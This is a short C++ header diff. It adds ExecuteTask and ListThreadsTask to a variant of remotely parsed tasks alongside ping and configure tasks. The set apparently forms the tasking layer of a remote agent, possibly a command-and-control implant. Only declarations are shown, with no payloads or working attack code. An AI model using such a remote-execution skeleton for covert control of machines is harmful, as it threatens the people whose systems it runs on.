@@ -50,10 +50,35 @@ private:
 };
 
 
+// ExecuteTask
+// -------------------------------------------------------------------------------------------
+struct ExecuteTask {
+	ExecuteTask(const boost::uuids::uuid& id, std::string command);
+	constexpr static std::string_view key{ "execute" };
+	[[nodiscard]] Result run() const;
+	const boost::uuids::uuid id;
+
+private:
+	const std::string command;
+};
+
+
+// ListThreadsTask
+// -------------------------------------------------------------------------------------------
+struct ListThreadsTask {
+	ListThreadsTask(const boost::uuids::uuid& id, std::string processId);
+	constexpr static std::string_view key{ "list-threads" };
+	[[nodiscard]] Result run() const;
+	const boost::uuids::uuid id;
+
+private:
+	const std::string processId;
+};
+
 // ===========================================================================================
 
 // REMEMBER: Any new tasks must be added here too!
-using Task = std::variant<PingTask, ConfigureTask>;
+using Task = std::variant<PingTask, ConfigureTask, ExecuteTask, ListThreadsTask>;
 
 [[nodiscard]] Task parseTaskFrom(const boost::property_tree::ptree& taskTree,
 	std::function<void(const Configuration&)> setter);
